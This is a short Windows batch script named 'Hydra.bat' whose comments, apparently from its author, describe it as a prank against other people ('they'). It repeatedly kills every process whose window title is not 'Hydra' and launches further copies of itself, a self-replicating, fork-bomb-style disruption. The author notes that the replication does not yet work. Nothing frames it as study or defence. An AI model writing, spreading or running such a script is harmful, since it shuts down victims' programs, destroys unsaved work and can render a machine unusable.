::The "Hydra" part isn't working yet. But it will.
@ECHO OFF
:loop
SET n=1
title Hydra.bat
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /FI "WINDOWTITLE ne Hydra" ::Closes everything except for itself. They have to have a batch file already on their desktop titled Hydra to stop this one.
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
SET /a n+=1
)
GOTO :loop
